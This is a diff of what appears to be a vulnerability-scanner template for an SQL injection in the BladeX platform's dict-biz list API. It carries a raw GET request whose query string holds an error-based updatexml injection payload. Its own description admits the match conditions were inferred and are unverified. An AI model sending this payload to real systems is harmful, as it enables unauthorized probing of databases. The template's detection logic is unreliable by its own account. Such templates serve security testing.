@@ -3,14 +3,8 @@ info:
   name: bladex-dict-biz-list-sql注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gb4yo8vycag25v8b
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: gb4yo8vycag25v8b
-    fofa: body="[https://bladex.vip/"](https://bladex.vip/"" \o "https://bladex.vip/\"" \t "https://wx.zsxq.com/dweb2/index/group/_blank)
 http:
 - raw:
   - 'GET /api/blade-system/dict-biz/list?updatexml(1,concat(0x5c,md5(123456),0x5c),1)=1 HTTP/1.1
